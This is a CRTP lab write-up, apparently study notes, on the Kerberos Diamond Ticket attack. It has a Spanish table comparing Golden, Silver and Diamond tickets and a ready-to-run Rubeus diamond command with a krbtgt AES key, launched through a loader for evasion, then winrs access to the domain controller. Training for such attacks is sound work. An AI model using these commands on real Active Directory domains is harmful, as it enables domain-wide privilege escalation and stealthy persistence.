# Learning Objetive 10

* Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.

***

### Diffrence between Golden-Silver-Diamond Ticket

| **Hash que se usa**        | Hash NTLM (RC4) o AES del usuario **krbtgt**                      | Hash NTLM (RC4) o AES de la **cuenta de máquina** del servidor objetivo (ej. dcorp-dc$)                     | Hash NTLM o AES del usuario **krbtgt** + **modificación del PAC** (agrega grupos extras o cambia SID)   |
| -------------------------- | ----------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| **Alcance**                | Todo el dominio: cualquier servicio, cualquier máquina            | Solo el servidor concreto (el que tiene la cuenta de máquina)                                               | Todo el dominio, igual que golden, pero con PAC modificado                                              |
| **Qué impersonas**         | Cualquier usuario (normalmente Administrator o krbtgt)            | Cualquier usuario, pero solo en ese servidor                                                                | Cualquier usuario + puedes **agregar grupos arbitrarios** al PAC (ej. Domain Admins, Enterprise Admins) |
| **Duración**               | 10 años (configurable)                                            | 10 años (configurable)                                                                                      | Igual que golden (10 años)                                                                              |
| **Modifica el PAC**        | No (usa el PAC real del usuario)                                  | No (usa el PAC real del usuario)                                                                            | **Sí** — puedes meter grupos extras que el usuario real no tiene                                        |
| **OPSEC / Detección**      | Muy alto riesgo: toca krbtgt → EDR detecta TGT requests de krbtgt | Bajo riesgo: no toca krbtgt                                                                                 | Muy alto riesgo (igual que golden) + detección extra por PAC anormal                                    |
| **Uso principal**          | Acceso total al dominio como DA                                   | Acceso sigiloso a un servidor concreto (WinRM, WMI, shares)                                                 | Bypassear restricciones de grupos / RBAC cuando el usuario real no es DA                                |
| **Herramienta típica**     | Rubeus golden / Mimikatz kerberos::golden                         | Rubeus silver / Mimikatz kerberos::golden + /service                                                        | Rubeus diamond / Mimikatz (versión reciente) o custom tools                                             |
| **Ejemplo comando Rubeus** | `Rubeus.exe golden /user:Administrator /krbtgt:... /ptt`          | <p><code>Rubeus.exe silver</code></p><p><code>/service:http/...</code></p><p><code>/rc4:... /ptt</code></p> | `Rubeus.exe diamond /user:Administrator /krbtgt:... /groupsid:... /ptt`                                 |
| **En el lab CRTP**         | LO8: obtienes DA total                                            | LO9: acceso a servicios concretos sin ruido                                                                 | LO10                                                                                                    |

***

## Rubeus Diamond Ticket

We can simply use the following Rubeus command to execute the attack.

> Note that the command needs to be run from an elevated shell (Run as administrator).
>
> We take the usual OPSEC care of using Loader:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Access the DC using winrs from the new spawned process!

```
winrs -r:dcorp-dc cmd
set username
```

<figure><img src="../../../../.gitbook/assets/image (66) (1).png" alt=""><figcaption></figcaption></figure>
